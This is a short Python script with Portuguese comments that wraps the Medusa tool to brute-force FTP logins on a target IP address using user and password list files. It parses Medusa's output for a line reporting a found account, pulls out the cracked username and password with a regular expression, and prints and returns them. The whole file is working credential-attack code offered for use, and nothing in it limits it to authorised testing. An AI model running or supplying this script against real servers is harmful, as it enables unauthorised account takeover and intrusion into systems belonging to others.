import subprocess
import re

def b_f(ip, user_file, password_file):
    print(f"Iniciando ataque de força bruta no FTP em {ip}...")
    commandAttacking = ["medusa", "-h", ip, "-U", user_file, "-P", password_file, "-M", "ftp", "-t", "6"]
    
    try:
        result = subprocess.run(commandAttacking, capture_output=True, text=True)

        output = result.stdout
        error_output = result.stderr

        if output:
            # A linha "ACCOUNT FOUND" pode estar em qualquer lugar da saída, 
            # então é melhor procurar por ela primeiro.
            if "ACCOUNT FOUND" in output:
                # --- ESTA É A LINHA CORRIGIDA ---
                # Regex mais específica para garantir a captura correta.
                match = re.search(r"User: (.*?) Password: (.*?)\s\[SUCCESS\]", output)
                
                if match:
                    # Grupo 1 é o usuário, Grupo 2 é a senha
                    user = match.group(1).strip()
                    password = match.group(2).strip()
                    print(f"\n[SUCCESS] Credenciais encontradas! -> Usuário: {user} | Senha: {password}")
                    return user, password
                else:
                    # Isso pode acontecer se a linha "ACCOUNT FOUND" existir, mas o formato for inesperado.
                    print("Sucesso detectado ('ACCOUNT FOUND'), mas não foi possível extrair as credenciais com a regex.")
                    print("Verifique o formato da linha de sucesso na saída do Medusa.")
                    return None, None
            else:
                print("\nNenhuma credencial encontrada pelo Medusa (nenhuma linha com 'ACCOUNT FOUND').")
                return None, None
        
        else:
            print("\nO Medusa não produziu nenhuma saída padrão (stdout).")
            if error_output:
                print("--- Saída de Erro do Medusa (stderr) ---")
                print(error_output)
                print("-----------------------------------------")
            return None, None

    except FileNotFoundError:
        print("Erro Crítico: O comando 'medusa' não foi encontrado. Verifique se está instalado e no seu PATH.")
        return None, None
    except Exception as e:
        print(f"Ocorreu um erro inesperado ao executar o Medusa: {e}")
        return None, None
